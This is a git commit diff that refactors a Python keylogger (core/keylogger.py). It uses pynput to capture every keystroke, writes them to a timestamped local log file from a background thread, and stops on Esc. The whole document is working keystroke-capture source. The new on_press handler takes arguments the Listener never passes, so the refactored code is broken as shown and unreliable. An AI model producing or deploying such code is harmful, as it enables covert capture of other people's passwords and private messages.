08d0787111dd9b28fdc97df740884f3847be55d8
thatfossyguy <social_media.jqt3s@simplelogin.co>
2023-03-06 18:25:42 +0530

    Optimization in the speed of program.

--- core/keylogger.py
+++ core/keylogger.py
@@ -2,40 +2,58 @@ import pynput
 from pynput.keyboard import Key, Listener
 import datetime
 import time
+import threading
+import queue
 
-unix_time = int(time.mktime(datetime.datetime.now().timetuple()))
-count, keys = 0, []
+
+def write_file_worker(queue, unix_time):
+    """Worker function to write keystrokes to a file in the background."""
+    with open(f"log_{unix_time}.txt", "a") as file:
+        while True:
+            keys = queue.get()
+            if keys is None:
+                break
+
+            buffer = ""
+            for key in keys:
+                if key == Key.space:
+                    buffer += " "
+                elif not isinstance(key, Key):
+                    buffer += str(key).replace("'", "\n")
+
+            file.write(buffer)
 
 
-def on_press(key):
+def on_press(key, keys, count, queue):
     """Reset the `count` to zero, and transfer the data in `keys` to the designated text file while clearing the list."""
-    global keys, count
     keys.append(key)
     count += 1
     print(f"{key} pressed")
 
     if count >= 10:
         count = 0
-        write_file(keys)
-        keys = []
+        queue.put(keys)
+        keys.clear()
+
+    return count
 
 
-def write_file(keys):
-    """Save the keystrokes to a textfile with `log_[CURRENT UNIX TIME].txt` format."""
-    with open(f"log_{unix_time}.txt", "a") as file:
-        for key in keys:
-            k = str(key).replace("'", "\n")
-            if k.find("space") > 0:
-                file.write("")
-            elif k.find("Key") == -1:
-                file.write(k)
-
-
-def on_release(key):
+def on_release(key, queue):
     """Kill the program on hitting the `Esc` button."""
     if key == Key.esc:
+        queue.put(None)
         return False
 
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
+unix_time = int(time.mktime(datetime.datetime.now().timetuple()))
+count, keys = 0, []
+queue = queue.Queue()
+
+write_file_thread = threading.Thread(
+    target=write_file_worker, args=(queue, unix_time))
+write_file_thread.start()
+
+with Listener(on_press=on_press, on_release=lambda key: on_release(key, queue)) as listener:
     listener.join()
+
+write_file_thread.join()
